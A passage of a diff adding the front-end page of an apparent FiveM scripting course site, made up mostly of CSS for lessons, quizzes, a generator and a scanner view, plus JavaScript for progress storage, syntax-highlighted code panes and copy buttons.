@@ -1,0 +1,918 @@
+<title>FiveM Script Garage</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@600;700&family=IBM+Plex+Sans:ital,wght@0,400;0,500;0,600;1,400&family=JetBrains+Mono:wght@400;500;600&display=swap">
+<style>
+/* Layout: a server admin panel. Fixed resource rail on the left, one reading column on the right.
+   Warm greys biased toward dispatch amber; amber itself only marks "you are here" and the one primary action. */
+:root {
+  --bg: #f4f2ee;
+  --panel: #fbfaf7;
+  --raised: #ebe7e0;
+  --line: #d6cfc4;
+  --line-soft: #e4dfd6;
+  --fg: #1e1a15;
+  --muted: #554d43;
+  --dim: #82786b;
+  --accent: #9c5800;
+  --accent-fill: #e39b30;
+  --accent-ink: #1e1305;
+  --accent-soft: rgba(214, 140, 32, 0.13);
+  --ok: #2d7a47;
+  --ok-soft: rgba(45, 122, 71, 0.1);
+  --bad: #b03a2f;
+  --bad-soft: rgba(176, 58, 47, 0.08);
+  --code-bg: #fbfaf6;
+  --code-bar: #eeeae3;
+  --code-fg: #2a251f;
+  --gutter: #a69c8e;
+  --sx-comment: #8a8072;
+  --sx-string: #4a7628;
+  --sx-number: #9a5410;
+  --sx-keyword: #8c3a26;
+  --sx-function: #2c5b86;
+  --sx-punct: #6d6457;
+  --sx-builtin: #2f6b5f;
+  --sx-attr: #85640f;
+  --display: "Chakra Petch", "Bahnschrift", "Segoe UI", sans-serif;
+  --body: "IBM Plex Sans", "Segoe UI", system-ui, -apple-system, sans-serif;
+  --mono: "JetBrains Mono", ui-monospace, "Cascadia Code", Consolas, monospace;
+  --rail-w: 280px;
+  --r: 4px;
+}
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) {
+    --bg: #12110f; --panel: #181613; --raised: #221f1b; --line: #38322b; --line-soft: #29251f;
+    --fg: #ece6dc; --muted: #ada396; --dim: #7c7368;
+    --accent: #e9a33b; --accent-fill: #e9a33b; --accent-ink: #1e1305; --accent-soft: rgba(233, 163, 59, 0.12);
+    --ok: #6fbf88; --ok-soft: rgba(111, 191, 136, 0.11); --bad: #e8806f; --bad-soft: rgba(232, 128, 111, 0.1);
+    --code-bg: #0e0d0b; --code-bar: #1a1815; --code-fg: #d8d1c5; --gutter: #575047;
+    --sx-comment: #70685d; --sx-string: #a8c389; --sx-number: #dfa768; --sx-keyword: #d0906f; --sx-function: #93b6d6;
+    --sx-punct: #8b8275; --sx-builtin: #8fc3b5; --sx-attr: #d9b46d;
+    color-scheme: dark;
+  }
+}
+:root[data-theme="dark"] {
+  --bg: #12110f; --panel: #181613; --raised: #221f1b; --line: #38322b; --line-soft: #29251f;
+  --fg: #ece6dc; --muted: #ada396; --dim: #7c7368;
+  --accent: #e9a33b; --accent-fill: #e9a33b; --accent-ink: #1e1305; --accent-soft: rgba(233, 163, 59, 0.12);
+  --ok: #6fbf88; --ok-soft: rgba(111, 191, 136, 0.11); --bad: #e8806f; --bad-soft: rgba(232, 128, 111, 0.1);
+  --code-bg: #0e0d0b; --code-bar: #1a1815; --code-fg: #d8d1c5; --gutter: #575047;
+  --sx-comment: #70685d; --sx-string: #a8c389; --sx-number: #dfa768; --sx-keyword: #d0906f; --sx-function: #93b6d6;
+  --sx-punct: #8b8275; --sx-builtin: #8fc3b5; --sx-attr: #d9b46d;
+  color-scheme: dark;
+}
+* { box-sizing: border-box; }
+html, body { height: 100%; }
+body { background: var(--bg); color: var(--fg); font-family: var(--body); font-size: 16px; line-height: 1.6; -webkit-font-smoothing: antialiased; }
+body::before { content: ""; position: fixed; inset: 0 0 auto; height: env(safe-area-inset-top, 0px); z-index: 60; background: var(--panel); }
+a { color: var(--accent); text-underline-offset: 3px; }
+a:hover { color: var(--fg); }
+:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }
+h1, h2, h3 { font-family: var(--display); line-height: 1.2; text-wrap: balance; margin: 0; font-weight: 700; }
+p { margin: 0; }
+code { font-family: var(--mono); font-size: 0.85em; background: var(--raised); padding: 0.1em 0.35em; border-radius: 3px; overflow-wrap: anywhere; }
+kbd { font-family: var(--mono); font-size: 0.8em; padding: 0.05em 0.4em; border-radius: 3px; border: 1px solid var(--line); border-bottom-width: 2px; background: var(--panel); }
+button { font: inherit; color: inherit; }
+.mono { font-family: var(--mono); }
+.label { font-family: var(--mono); font-size: 0.74rem; font-weight: 500; letter-spacing: 0.04em; color: var(--dim); }
+
+/* ---------- buttons, tags ---------- */
+.btn { display: inline-flex; align-items: center; gap: 8px; padding: 7px 13px; border-radius: var(--r); border: 1px solid var(--line); background: var(--panel); color: var(--fg); font-size: 0.9rem; font-weight: 500; cursor: pointer; text-decoration: none; line-height: 1.3; }
+.btn:hover { border-color: var(--dim); color: var(--fg); }
+.btn.primary { background: var(--accent-fill); border-color: var(--accent-fill); color: var(--accent-ink); font-weight: 600; }
+.btn.primary:hover { filter: brightness(1.06); color: var(--accent-ink); }
+.btn.small { padding: 4px 10px; font-size: 0.82rem; }
+.btn:disabled { opacity: 0.45; cursor: not-allowed; }
+.tag { display: inline-block; font-family: var(--mono); font-size: 0.7rem; font-weight: 500; line-height: 1; padding: 4px 6px 3px; border: 1px solid var(--line); border-radius: 3px; color: var(--muted); white-space: nowrap; letter-spacing: 0.02em; }
+
+/* ---------- shell ---------- */
+.shell { display: grid; grid-template-columns: var(--rail-w) minmax(0, 1fr); min-height: 100%; }
+.rail {
+  position: sticky; top: 0; height: 100vh; overflow-y: auto;
+  background: var(--panel); border-right: 1px solid var(--line);
+  padding-block: calc(18px + env(safe-area-inset-top, 0px)) 22px;
+  padding-left: max(16px, env(safe-area-inset-left, 0px)); padding-right: 16px;
+  display: flex; flex-direction: column; gap: 20px;
+}
+.wordmark { display: flex; flex-direction: column; gap: 2px; text-decoration: none; color: var(--fg); padding: 0 6px; }
+.wordmark b { font-family: var(--display); font-size: 1.15rem; font-weight: 700; letter-spacing: 0.01em; }
+.wordmark span { font-family: var(--mono); font-size: 0.7rem; color: var(--dim); }
+.wordmark:hover { color: var(--fg); }
+.meter { display: flex; flex-direction: column; gap: 7px; padding: 0 6px; }
+.meter-row { display: flex; justify-content: space-between; align-items: baseline; font-size: 0.82rem; color: var(--muted); }
+.meter-row b { font-family: var(--mono); font-weight: 600; color: var(--fg); font-variant-numeric: tabular-nums; }
+.ticks { display: grid; gap: 2px; height: 6px; }
+.ticks i { background: var(--raised); }
+.ticks i.on { background: var(--ok); }
+.nav { display: flex; flex-direction: column; }
+.nav-label { font-family: var(--mono); font-size: 0.7rem; color: var(--dim); padding: 0 6px 6px; letter-spacing: 0.04em; }
+.nav-link { display: grid; grid-template-columns: 22px minmax(0, 1fr) 8px; align-items: center; gap: 8px; padding: 5px 6px; text-decoration: none; color: var(--muted); font-size: 0.9rem; line-height: 1.3; border-radius: 3px; }
+.nav-link:hover { background: var(--raised); color: var(--fg); }
+.nav-link.active { background: var(--accent-soft); color: var(--fg); box-shadow: inset 2px 0 0 var(--accent-fill); }
+.nav-link .n { font-family: var(--mono); font-size: 0.74rem; color: var(--dim); font-variant-numeric: tabular-nums; }
+.nav-link.active .n { color: var(--accent); }
+.nav-link .st { width: 8px; height: 8px; border: 1px solid var(--line); }
+.nav-link.done .st { background: var(--ok); border-color: var(--ok); }
+.rail-foot { margin-top: auto; padding: 0 6px; font-size: 0.74rem; color: var(--dim); line-height: 1.5; display: flex; flex-direction: column; gap: 10px; align-items: flex-start; }
+.rail-foot:has(#appSlot:empty) { gap: 0; }
+.code-row { display: flex; gap: 8px; flex-wrap: wrap; max-width: 560px; }
+.code-row .input { flex: 1 1 220px; width: auto; }
+.hint.ok { color: var(--ok); }
+
+.topbar { display: none; }
+.main { min-width: 0; padding-block: 34px 72px; padding-left: max(32px, env(safe-area-inset-left, 0px)); padding-right: max(32px, env(safe-area-inset-right, 0px)); }
+.col { max-width: 820px; display: flex; flex-direction: column; gap: 32px; }
+.col.wide { max-width: 1160px; }
+
+/* ---------- page heads ---------- */
+.page-head { display: flex; flex-direction: column; gap: 10px; padding-bottom: 22px; border-bottom: 1px solid var(--line); }
+.crumb { font-family: var(--mono); font-size: 0.78rem; color: var(--dim); }
+.crumb a { color: var(--dim); text-decoration: none; }
+.crumb a:hover { color: var(--fg); text-decoration: underline; }
+.page-head h1 { font-size: clamp(1.7rem, 3vw, 2.2rem); }
+.lead { font-size: 1.05rem; color: var(--muted); max-width: 66ch; }
+.meta { display: flex; flex-wrap: wrap; gap: 6px 16px; font-family: var(--mono); font-size: 0.78rem; color: var(--dim); }
+.meta .ok { color: var(--ok); }
+.meta a { color: var(--dim); }
+.meta a:hover { color: var(--fg); }
+h2.h { font-size: 1.25rem; }
+.block { display: flex; flex-direction: column; gap: 14px; }
+
+/* ---------- home ---------- */
+.console { border: 1px solid var(--line); border-radius: var(--r); background: var(--code-bg); overflow: hidden; }
+.console-bar { display: flex; justify-content: space-between; gap: 10px; padding: 6px 12px; background: var(--code-bar); border-bottom: 1px solid var(--line); font-family: var(--mono); font-size: 0.74rem; color: var(--dim); }
+.console pre { margin: 0; padding: 12px 14px; font-family: var(--mono); font-size: 0.84rem; line-height: 1.7; color: var(--code-fg); overflow-x: auto; }
+.console .pr { color: var(--accent); }
+.console .tg { color: var(--dim); }
+.actions { display: flex; flex-wrap: wrap; gap: 8px; }
+.list { width: 100%; border-collapse: collapse; font-size: 0.92rem; }
+.list th { text-align: left; font-family: var(--mono); font-size: 0.72rem; font-weight: 500; color: var(--dim); padding: 0 10px 7px; border-bottom: 1px solid var(--line); letter-spacing: 0.03em; }
+.list td { padding: 8px 10px; border-bottom: 1px solid var(--line-soft); vertical-align: baseline; }
+.list tr:hover td { background: var(--panel); }
+.list .n { font-family: var(--mono); font-size: 0.8rem; color: var(--dim); width: 1%; font-variant-numeric: tabular-nums; }
+.list .t a { color: var(--fg); text-decoration: none; font-weight: 500; }
+.list .t a:hover { color: var(--accent); text-decoration: underline; }
+.list .g, .list .m { color: var(--muted); font-size: 0.86rem; white-space: nowrap; }
+.list .m { font-family: var(--mono); font-size: 0.78rem; }
+.st-text { font-family: var(--mono); font-size: 0.76rem; color: var(--dim); white-space: nowrap; }
+.st-text.ok { color: var(--ok); }
+.tools { display: flex; flex-direction: column; border-top: 1px solid var(--line-soft); }
+.tool-row { display: grid; grid-template-columns: 200px minmax(0, 1fr); gap: 4px 20px; padding: 11px 0; border-bottom: 1px solid var(--line-soft); text-decoration: none; color: var(--fg); }
+.tool-row b { font-weight: 600; }
+.tool-row span { color: var(--muted); font-size: 0.92rem; }
+.tool-row:hover b { color: var(--accent); text-decoration: underline; }
+.tool-row:hover { color: var(--fg); }
+.where { display: grid; grid-template-columns: auto minmax(0, 1fr); gap: 8px 14px; align-items: baseline; font-size: 0.92rem; color: var(--muted); }
+
+/* ---------- prose ---------- */
+.prose { display: flex; flex-direction: column; gap: 14px; min-width: 0; }
+.prose p, .prose li { max-width: 68ch; }
+.prose ul, .prose ol { margin: 0; padding-left: 1.25em; display: flex; flex-direction: column; gap: 5px; }
+.prose li::marker { color: var(--dim); }
+.prose strong { font-weight: 600; }
+.section { display: flex; flex-direction: column; gap: 14px; }
+.section > h2 { font-size: 1.3rem; }
+.callout { border: 1px solid var(--line); border-radius: var(--r); padding: 10px 13px; background: var(--panel); display: flex; flex-direction: column; gap: 3px; }
+.callout-tag { font-family: var(--mono); font-size: 0.72rem; font-weight: 600; color: var(--muted); letter-spacing: 0.03em; }
+.callout.warn { border-color: color-mix(in srgb, var(--bad) 40%, var(--line)); background: var(--bad-soft); }
+.callout.warn .callout-tag { color: var(--bad); }
+.table-wrap { overflow-x: auto; border: 1px solid var(--line); border-radius: var(--r); }
+table { border-collapse: collapse; width: 100%; font-size: 0.9rem; }
+.table-wrap th, .table-wrap td { text-align: left; padding: 8px 11px; border-bottom: 1px solid var(--line-soft); vertical-align: top; }
+.table-wrap th { font-family: var(--mono); font-weight: 500; font-size: 0.74rem; color: var(--dim); background: var(--panel); border-bottom-color: var(--line); }
+.table-wrap tbody tr:last-child td { border-bottom: 0; }
+
+/* ---------- editor (code blocks) ---------- */
+.editor { border: 1px solid var(--line); border-radius: var(--r); background: var(--code-bg); overflow: hidden; min-width: 0; }
+.editor-bar { display: flex; align-items: stretch; gap: 8px; background: var(--code-bar); border-bottom: 1px solid var(--line); min-height: 34px; }
+.etabs { display: flex; min-width: 0; overflow-x: auto; scrollbar-width: thin; position: relative; }
+.etab { flex: none; display: inline-flex; align-items: center; gap: 8px; padding: 0 13px; font-family: var(--mono); font-size: 0.78rem; color: var(--dim); border: 0; border-right: 1px solid var(--line); background: none; cursor: default; white-space: nowrap; }
+button.etab { cursor: pointer; }
+button.etab:hover { color: var(--fg); }
+.etab.on { background: var(--code-bg); color: var(--fg); box-shadow: inset 0 2px 0 var(--accent-fill); margin-bottom: -1px; }
+.editor-bar.multi { flex-wrap: wrap; row-gap: 0; }
+.editor-bar.multi .etabs { flex: 0 1 auto; min-height: 34px; }
+.editor-bar.multi .editor-tools { min-height: 34px; }
+.editor-tools { margin-left: auto; display: flex; align-items: center; gap: 8px; padding: 0 8px; flex: none; }
+.copy { font-family: var(--mono); font-size: 0.74rem; border: 1px solid var(--line); background: var(--panel); border-radius: 3px; padding: 3px 9px; cursor: pointer; color: var(--muted); white-space: nowrap; }
+.copy:hover { color: var(--fg); border-color: var(--dim); }
+.copy.done { color: var(--ok); border-color: var(--ok); }
+.editor-body { display: grid; grid-template-columns: auto minmax(0, 1fr); }
+.editor-body.no-gutter { grid-template-columns: minmax(0, 1fr); }
+.editor pre { margin: 0; font-family: var(--mono); font-size: 0.82rem; line-height: 1.65; tab-size: 4; }
+.editor .gutter { padding: 12px 10px 12px 14px; text-align: right; color: var(--gutter); user-select: none; border-right: 1px solid var(--line-soft); font-variant-numeric: tabular-nums; }
+.editor .src { padding: 12px 16px; overflow-x: auto; color: var(--code-fg); }
+.editor .src code { background: none; padding: 0; font-size: inherit; border-radius: 0; overflow-wrap: normal; }
+.token.comment, .token.prolog, .token.doctype, .token.cdata { color: var(--sx-comment); font-style: italic; }
+.token.string, .token.attr-value, .token.char { color: var(--sx-string); }
+.token.number, .token.boolean, .token.constant { color: var(--sx-number); }
+.token.keyword, .token.important, .token.atrule { color: var(--sx-keyword); }
+.token.function { color: var(--sx-function); }
+.token.operator, .token.punctuation { color: var(--sx-punct); }
+.token.tag, .token.selector { color: var(--sx-keyword); }
+.token.attr-name, .token.property, .token.cfg-key { color: var(--sx-attr); }
+.token.class-name, .token.builtin { color: var(--sx-builtin); }
+
+/* ---------- lesson parts ---------- */
+.deeper-list { display: flex; flex-direction: column; border-top: 1px solid var(--line); }
+details.deeper { border-bottom: 1px solid var(--line); }
+details.deeper > summary { cursor: pointer; list-style: none; padding: 11px 2px; display: flex; align-items: center; gap: 10px; font-weight: 600; }
+details.deeper > summary::-webkit-details-marker { display: none; }
+details.deeper > summary::before { content: "+"; font-family: var(--mono); color: var(--dim); width: 12px; flex: none; }
+details.deeper[open] > summary::before { content: "\2212"; }
+details.deeper > summary:hover { color: var(--accent); }
+details.deeper > .prose { padding: 0 0 18px 22px; }
+.box { border: 1px solid var(--line); border-radius: var(--r); background: var(--panel); }
+.box-head { display: flex; align-items: baseline; gap: 12px; flex-wrap: wrap; padding: 9px 14px; border-bottom: 1px solid var(--line); }
+.box-head h2 { font-size: 1.1rem; }
+.box-body { padding: 14px; display: flex; flex-direction: column; gap: 14px; }
+.box-foot { padding: 10px 14px; border-top: 1px solid var(--line); display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
+.check { display: inline-flex; align-items: center; gap: 9px; font-size: 0.9rem; cursor: pointer; color: var(--muted); }
+.check input { width: 16px; height: 16px; accent-color: var(--ok); margin: 0; }
+
+.quiz-head { display: flex; align-items: baseline; justify-content: space-between; gap: 12px; flex-wrap: wrap; }
+.q { border: 1px solid var(--line); border-radius: var(--r); background: var(--panel); padding: 14px; display: flex; flex-direction: column; gap: 10px; }
+.q-text { font-weight: 600; display: flex; gap: 10px; }
+.q-text .n { font-family: var(--mono); font-size: 0.8rem; color: var(--dim); flex: none; padding-top: 3px; }
+.opts { display: flex; flex-direction: column; gap: 6px; }
+.opt { display: flex; align-items: flex-start; gap: 10px; padding: 8px 11px; border-radius: 3px; border: 1px solid var(--line-soft); background: var(--bg); cursor: pointer; }
+.opt:hover { border-color: var(--line); }
+.opt input { margin: 4px 0 0; accent-color: var(--accent-fill); flex: none; }
+.opt.picked { border-color: var(--accent-fill); }
+.opt.right { border-color: var(--ok); background: var(--ok-soft); }
+.opt.wrong { border-color: var(--bad); background: var(--bad-soft); }
+.why { font-size: 0.9rem; color: var(--muted); padding-left: 2px; }
+.why b { font-family: var(--mono); font-size: 0.78rem; font-weight: 600; margin-right: 6px; color: var(--ok); }
+.why.no b { color: var(--bad); }
+.quiz-foot { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
+.quiz-result { font-family: var(--mono); font-size: 0.84rem; font-weight: 600; }
+.quiz-result.pass { color: var(--ok); } .quiz-result.fail { color: var(--bad); }
+.count { font-family: var(--mono); font-size: 0.78rem; color: var(--dim); font-variant-numeric: tabular-nums; }
+.sources { margin: 0; padding: 0; list-style: none; display: flex; flex-direction: column; gap: 4px; font-size: 0.92rem; }
+.pager { display: flex; justify-content: space-between; gap: 12px; flex-wrap: wrap; padding-top: 14px; border-top: 1px solid var(--line); }
+.pager a { display: flex; flex-direction: column; gap: 1px; text-decoration: none; color: var(--fg); font-weight: 500; min-width: 0; }
+.pager a small { font-family: var(--mono); font-size: 0.72rem; color: var(--dim); font-weight: 400; }
+.pager a:hover { color: var(--accent); }
+.pager a.next { text-align: right; margin-left: auto; }
+
+/* ---------- generator ---------- */
+.gen { display: grid; grid-template-columns: minmax(260px, 330px) minmax(0, 1fr); gap: 28px; align-items: start; }
+.form { display: flex; flex-direction: column; gap: 16px; position: sticky; top: 20px; }
+.field { display: flex; flex-direction: column; gap: 5px; }
+.field label, .field .lbl { font-size: 0.84rem; font-weight: 600; color: var(--muted); }
+.input { width: 100%; padding: 8px 10px; border-radius: var(--r); border: 1px solid var(--line); background: var(--panel); color: var(--fg); font: inherit; font-size: 0.94rem; }
+.input.mono { font-family: var(--mono); font-size: 0.88rem; }
+.input:focus { outline: none; border-color: var(--accent-fill); box-shadow: 0 0 0 2px var(--accent-soft); }
+.input.invalid { border-color: var(--bad); }
+.hint { font-size: 0.8rem; color: var(--dim); }
+.hint.err { color: var(--bad); }
+.opt-list { border: 1px solid var(--line); border-radius: var(--r); background: var(--panel); }
+.opt-toggle { display: grid; grid-template-columns: 18px minmax(0, 1fr); gap: 2px 10px; padding: 10px 12px; cursor: pointer; }
+.opt-toggle + .opt-toggle { border-top: 1px solid var(--line-soft); }
+.opt-toggle:hover { background: var(--bg); }
+.opt-toggle input { width: 16px; height: 16px; margin: 3px 0 0; accent-color: var(--muted); }
+.opt-toggle b { font-weight: 600; font-size: 0.92rem; }
+.opt-toggle span { grid-column: 2; font-size: 0.82rem; color: var(--muted); line-height: 1.45; }
+.out { display: flex; flex-direction: column; gap: 18px; min-width: 0; }
+.out-head { display: flex; align-items: center; justify-content: space-between; gap: 10px; flex-wrap: wrap; }
+.path { font-family: var(--mono); font-size: 0.86rem; color: var(--muted); overflow-wrap: anywhere; }
+.path b { color: var(--fg); font-weight: 600; }
+.split { display: grid; grid-template-columns: minmax(0, 1fr) minmax(0, 1fr); gap: 14px; align-items: start; }
+.steps { margin: 0; padding-left: 1.3em; display: flex; flex-direction: column; gap: 6px; font-size: 0.92rem; color: var(--muted); }
+.steps li::marker { font-family: var(--mono); color: var(--dim); }
+
+/* ---------- cheat sheet ---------- */
+.filters { display: flex; flex-wrap: wrap; gap: 8px; align-items: center; }
+.filters .input { flex: 1 1 260px; width: auto; }
+.seg { display: inline-flex; border: 1px solid var(--line); border-radius: var(--r); overflow: hidden; background: var(--panel); }
+.seg button { border: 0; background: none; padding: 7px 12px; cursor: pointer; font-family: var(--mono); font-size: 0.8rem; color: var(--muted); }
+.seg button + button { border-left: 1px solid var(--line); }
+.seg button:hover { color: var(--fg); }
+.seg button.on { background: var(--raised); color: var(--fg); box-shadow: inset 0 -2px 0 var(--accent-fill); }
+select.input { flex: 0 1 220px; }
+.nat-table td { font-size: 0.88rem; }
+.nat-name { font-family: var(--mono); font-size: 0.84rem; font-weight: 500; white-space: nowrap; }
+.nat-name a { color: var(--fg); text-decoration: none; border-bottom: 1px dotted var(--dim); }
+.nat-name a:hover { color: var(--accent); border-color: var(--accent); }
+.rt { font-family: var(--mono); font-size: 0.68rem; color: var(--dim); display: block; margin-top: 3px; }
+.sig { display: block; font-family: var(--mono); font-size: 0.72rem; color: var(--dim); margin-top: 5px; overflow-wrap: anywhere; }
+.sig b { font-weight: 500; color: var(--muted); }
+.ex { font-family: var(--mono); font-size: 0.76rem; color: var(--muted); overflow-wrap: anywhere; }
+.empty { padding: 26px; text-align: center; color: var(--muted); border: 1px dashed var(--line); border-radius: var(--r); }
+
+/* ---------- scanner ---------- */
+textarea.input { font-family: var(--mono); font-size: 0.82rem; line-height: 1.6; background: var(--code-bg); color: var(--code-fg); resize: vertical; border-radius: 0; border: 0; padding: 12px 14px; }
+textarea.input:focus { box-shadow: inset 0 0 0 2px var(--accent-soft); }
+.scan-results { display: flex; flex-direction: column; }
+.finding { display: grid; grid-template-columns: 64px minmax(0, 1fr); gap: 2px 12px; padding: 9px 0; border-bottom: 1px solid var(--line-soft); }
+.sev { font-family: var(--mono); font-size: 0.72rem; font-weight: 600; padding-top: 2px; }
+.sev.high { color: var(--bad); }
+.sev.medium { color: var(--accent); }
+.sev.info { color: var(--dim); }
+.finding p { font-size: 0.9rem; }
+.finding code { font-size: 0.76rem; display: inline-block; max-width: 100%; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; vertical-align: bottom; }
+.clean { padding: 10px 0; color: var(--ok); font-weight: 500; }
+
+.toast { position: fixed; left: 50%; transform: translateX(-50%); bottom: calc(20px + env(safe-area-inset-bottom, 0px)); background: var(--fg); color: var(--bg); padding: 9px 16px; border-radius: var(--r); font-family: var(--mono); font-size: 0.84rem; z-index: 80; max-width: calc(100% - 32px); }
+.scrim { display: none; }
+
+/* ---------- responsive ---------- */
+@media (max-width: 1080px) {
+  .gen { grid-template-columns: minmax(0, 1fr); }
+  .form { position: static; }
+}
+@media (max-width: 900px) {
+  .shell { grid-template-columns: minmax(0, 1fr); }
+  .topbar {
+    display: flex; align-items: center; gap: 12px; position: sticky; top: env(safe-area-inset-top, 0px); z-index: 40;
+    background: var(--panel); border-bottom: 1px solid var(--line);
+    padding-block: 8px; padding-left: max(16px, env(safe-area-inset-left, 0px)); padding-right: max(16px, env(safe-area-inset-right, 0px));
+  }
+  .topbar .wordmark { padding: 0; }
+  .topbar .wordmark b { font-size: 1rem; }
+  .topbar .wordmark span { display: none; }
+  .topbar .mini { margin-left: auto; display: flex; align-items: center; gap: 8px; font-family: var(--mono); font-size: 0.76rem; color: var(--muted); font-variant-numeric: tabular-nums; }
+  .topbar .mini .ticks { width: 70px; }
+  .menu-btn { height: 34px; padding: 0 11px; border-radius: var(--r); border: 1px solid var(--line); background: var(--panel); font-family: var(--mono); font-size: 0.78rem; cursor: pointer; flex: none; }
+  .rail { position: fixed; left: 0; top: 0; bottom: 0; width: min(86vw, 310px); z-index: 70; transform: translateX(-102%); height: auto; }
+  body.nav-open .rail { transform: none; box-shadow: 12px 0 40px rgba(0, 0, 0, 0.3); }
+  .scrim { display: block; position: fixed; inset: 0; background: rgba(10, 8, 6, 0.5); z-index: 65; visibility: hidden; }
+  body.nav-open .scrim { visibility: visible; }
+  .main { padding-block: 22px 60px; padding-left: max(16px, env(safe-area-inset-left, 0px)); padding-right: max(16px, env(safe-area-inset-right, 0px)); }
+  .split { grid-template-columns: minmax(0, 1fr); }
+}
+@media (max-width: 640px) {
+  .list .g, .list th.g, .list .m, .list th.m { display: none; }
+  .tool-row { grid-template-columns: minmax(0, 1fr); }
+  .nat-table thead { display: none; }
+  .nat-table, .nat-table tbody, .nat-table tr, .nat-table td { display: block; width: 100%; }
+  .nat-table tr { padding: 11px 12px; border-bottom: 1px solid var(--line-soft); }
+  .nat-table td { border: 0 !important; padding: 2px 0 !important; }
+  .nat-table td.cat { display: none; }
+  .editor pre { font-size: 0.78rem; }
+  .editor .src { padding: 10px 12px; }
+  .editor .gutter { padding-left: 10px; padding-right: 8px; }
+  .col { gap: 28px; }
+}
+@media (prefers-reduced-motion: reduce) {
+  *, *::before, *::after { transition: none !important; animation: none !important; }
+}
+</style>
+
+<div class="topbar">
+  <button class="menu-btn" id="menuBtn" aria-label="Open lesson list" aria-expanded="false">Menu</button>
+  <a class="wordmark" href="#home"><b>Script Garage</b><span></span></a>
+  <div class="mini"><span id="miniCount">0/14</span><div class="ticks" id="miniTicks"></div></div>
+</div>
+<div class="scrim" id="scrim"></div>
+
+<div class="shell">
+  <aside class="rail" id="side" aria-label="Course navigation"></aside>
+  <main class="main" id="main" tabindex="-1"></main>
+</div>
+<div class="toast" id="toast" role="status" aria-live="polite" hidden></div>
+
+<script>window.Prism = window.Prism || {}; window.Prism.manual = true;</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-lua.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-csharp.min.js"></script>
+<script>
+/*@@APP@@*/
+/*@@DATA@@*/
+/*@@GEN@@*/
+(function () {
+  'use strict';
+  var DATA = window.GARAGE_DATA;
+  var LESSONS = DATA.lessons;
+  var TOTAL = LESSONS.length;
+  var STORE_KEY = 'fivem-script-garage-v1';
+  var $ = function (s, r) { return (r || document).querySelector(s); };
+  var esc = function (s) { return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;'); };
+  var pad = function (n) { return String(n).padStart(2, '0'); };
+
+  // ---------- progress (browser storage, optional) ----------
+  var progress = { done: {}, tasks: {} };
+  try { var saved = JSON.parse(localStorage.getItem(STORE_KEY) || 'null'); if (saved && saved.done) progress = { done: saved.done || {}, tasks: saved.tasks || {} }; } catch (e) {}
+  function save() { try { localStorage.setItem(STORE_KEY, JSON.stringify(progress)); } catch (e) {} }
+  function doneCount() { return LESSONS.filter(function (l) { return progress.done[l.id]; }).length; }
+  function nextLesson() { return LESSONS.find(function (l) { return !progress.done[l.id]; }) || null; }
+  function ticks() { return LESSONS.map(function (l) { return '<i class="' + (progress.done[l.id] ? 'on' : '') + '"></i>'; }).join(''); }
+
+  // ---------- code blocks: drawn as an editor pane ----------
+  var codeStore = [];
+  function sideOf(file, lang) {
+    var f = (file || '').toLowerCase();
+    if (/server\.cfg/.test(f)) return 'server.cfg';
+    if (/client/.test(f)) return 'client';
+    if (/server/.test(f)) return 'server';
+    if (/fxmanifest/.test(f)) return 'manifest';
+    if (/config|shared/.test(f)) return 'shared';
+    if (/\.(html|js|css)$/.test(f) || lang === 'html' || lang === 'css') return 'nui';
+    return '';
+  }
+  var PRISM_LANG = { lua: 'lua', js: 'javascript', html: 'markup', css: 'css', cs: 'csharp', ts: 'javascript' };
+  function highlight(code, lang) {
+    var P = window.Prism;
+    var pl = PRISM_LANG[lang];
+    if (P && P.languages && pl && P.languages[pl]) { try { return P.highlight(code, P.languages[pl], pl); } catch (e) {} }
+    if (lang === 'cfg') {
+      return code.split('\n').map(function (line) {
+        if (/^\s*#/.test(line)) return '<span class="token comment">' + esc(line) + '</span>';
+        var m = line.match(/^(\s*)(\S+)(.*)$/);
+        return m ? m[1] + '<span class="token cfg-key">' + esc(m[2]) + '</span>' + esc(m[3]) : esc(line);
+      }).join('\n');
+    }
+    return esc(code);
+  }
+  function copyLabel(file) {
+    var base = (file || '').split('/').pop();
+    return /\.\w+$/.test(base) ? 'Copy ' + base : 'Copy';
+  }
+  // opts: { tabs: html for the tab strip, extra: html for the tool area, gutter: false }
+  function codeBlock(code, lang, file, opts) {
+    opts = opts || {};
+    var id = codeStore.push(code) - 1;
+    var shown = code.replace(/\n+$/, '');
+    var side = sideOf(file, lang);
+    var useGutter = opts.gutter !== false && lang !== 'text';
+    var nums = '';
+    if (useGutter) { var n = shown.split('\n').length, a = []; for (var i = 1; i <= n; i++) a.push(i); nums = '<pre class="gutter" aria-hidden="true">' + a.join('\n') + '</pre>'; }
+    var tabs = opts.tabs || '<span class="etab on">' + esc(file || lang) + '</span>';
+    return '<div class="editor"><div class="editor-bar' + (opts.tabs ? ' multi' : '') + '"><div class="etabs"' + (opts.tabs ? ' role="tablist" aria-label="Generated files"' : '') + '>' + tabs + '</div>' +
+      '<div class="editor-tools">' + (side ? '<span class="tag">' + side + '</span>' : '') + (opts.extra || '') +
+      '<button class="copy" data-copy="' + id + '">' + copyLabel(file) + '</button></div></div>' +
+      '<div class="editor-body' + (useGutter ? '' : ' no-gutter') + '">' + nums + '<pre class="src"><code>' + highlight(shown, lang) + '</code></pre></div></div>';
+  }
+  function parts(list) {
+    return list.map(function (p) { return p.t === 'code' ? codeBlock(p.code, p.lang, p.file) : p.h; }).join('\n');
+  }
+  function copyText(text, btn) {
+    var ok = function () {
+      if (!btn) return;
+      var old = btn.getAttribute('data-label') || btn.textContent;
+      btn.setAttribute('data-label', old);
+      btn.classList.add('done'); btn.textContent = 'Copied';
+      setTimeout(function () { btn.classList.remove('done'); btn.textContent = old; }, 1600);
+    };
+    var fallback = function () {
